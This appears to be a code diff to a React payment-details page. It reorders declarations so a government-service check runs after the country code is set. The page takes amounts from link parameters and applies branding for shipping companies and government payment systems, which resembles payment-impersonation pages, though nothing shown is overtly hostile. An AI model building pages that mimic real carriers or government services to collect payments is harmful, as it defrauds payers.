@@ -40,10 +40,6 @@ const PaymentDetails = () => {
   const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
-  
-  // Check if this is a government service
-  const isGovService = isGovernmentService(serviceKey);
-  const govSystem = getGovernmentPaymentSystem(countryCode);
   const shippingInfo = linkData?.payload as any;
   
   const amountParam = searchParams.get('amount') || searchParams.get('a');
@@ -56,6 +52,10 @@ const PaymentDetails = () => {
   
   const countryCode = countryParam || inferredCountryFromCurrency || shippingInfo?.selectedCountry || "SA";
   const currencyInfo = getCurrencyByCountry(countryCode);
+  
+  // Check if this is a government service
+  const isGovService = isGovernmentService(serviceKey);
+  const govSystem = getGovernmentPaymentSystem(countryCode);
 
   const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
   let amount = 500;
